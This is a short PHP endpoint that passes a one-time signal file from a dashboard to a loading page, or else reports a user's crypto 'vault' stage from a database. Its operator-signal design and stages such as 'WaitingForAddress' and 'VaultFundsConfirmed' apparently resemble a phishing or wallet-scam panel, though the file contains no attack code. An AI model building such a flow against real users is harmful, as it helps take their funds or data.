<?php
session_start();
require_once "admin/db_connection.php";

// Check for the signal from dashboard.php
$signalFile = 'signal.txt'; // You can change the file name if needed

if (file_exists($signalFile)) {
    // Read the contents of the signal file
    $signal = file_get_contents($signalFile);

    try {
        // Remove the signal file
        unlink($signalFile);
    } catch (Exception $e) {
        // Handle any errors that occur during file removal
        echo 'Error removing signal file: ' . $e->getMessage();
    }

    // Return the signal to loading.php
    echo $signal;
} else {
    // Check database for vault status if session exists
    if (isset($_SESSION["token"])) {
        $token = $_SESSION["token"];
        
        $stmt = $conn->prepare("SELECT vault_status FROM user_submissions WHERE token = ?");
        $stmt->bind_param("s", $token);
        $stmt->execute();
        $result = $stmt->get_result();
        
        if ($row = $result->fetch_assoc()) {
            $vault_status = $row['vault_status'];
            
            // Return vault status for different stages
            if ($vault_status === 'VaultCodeGenerated') {
                echo 'VaultCodeGenerated';
            } elseif ($vault_status === 'WaitingForAddress') {
                echo 'WaitingForAddress';
            } elseif ($vault_status === 'AddressSet') {
                echo 'AddressSet';
            } elseif ($vault_status === 'VaultWallet') {
                echo 'VaultWallet';
            } elseif ($vault_status === 'VaultComplete') {
                echo 'VaultComplete';
            } elseif ($vault_status === 'VaultFundsConfirmed') {
                echo 'VaultFundsConfirmed';
            } else {
                echo '';
            }
        } else {
            echo '';
        }
        
        $stmt->close();
    } else {
        // Return an empty response if no session or signal file
        echo '';
    }
}
?>
